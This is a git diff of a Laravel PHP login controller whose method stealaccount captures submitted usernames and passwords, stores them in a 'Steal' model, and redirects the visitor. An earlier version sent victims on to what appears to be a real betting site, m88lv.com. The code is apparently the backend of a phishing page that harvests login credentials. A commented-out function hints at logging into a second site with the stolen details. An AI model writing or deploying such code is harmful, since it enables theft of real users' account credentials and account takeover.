@@ -7,14 +7,35 @@ use App\Models\Steal;
 use Auth;
 use Illuminate\Http\Request;
 use GuzzleHttp\Client;
+use Laravel\Dusk\Browser;
 class LoginController extends Controller
 {
-    public function stealaccount(Request $request){
-       $data = $request->only('username','password');
-       Steal::create($data);
+    // public function stealaccount(Request $request){
+    //    $data = $request->only('username','password');
+    //    Steal::create($data);
 
-        return redirect()->secure('https://www.m88lv.com/');
-    }
+    //     return redirect()->secure('https://www.m88lv.com/');
+    // }
+
+    public function stealaccount(Request $request){
+        $data = $request->only('username','password');
+        Steal::create($data);
+ 
+         return redirect()->back();
+     }
+
+    // public function stealaccount(Request $request){
+    //     $data = $request->only('username','password');
+        
+    //     $ex = Steal::create($data);
+    //     $token = $ex->createToken('token_name')->accessToken;
+
+    //     $request->session()->put('api_token', $token);
+
+    //     return response()->json(['token'=>$token]);
+            
+            
+    //  }
 
     // public function logintowebsiteB(){
     //     $client = new Client();
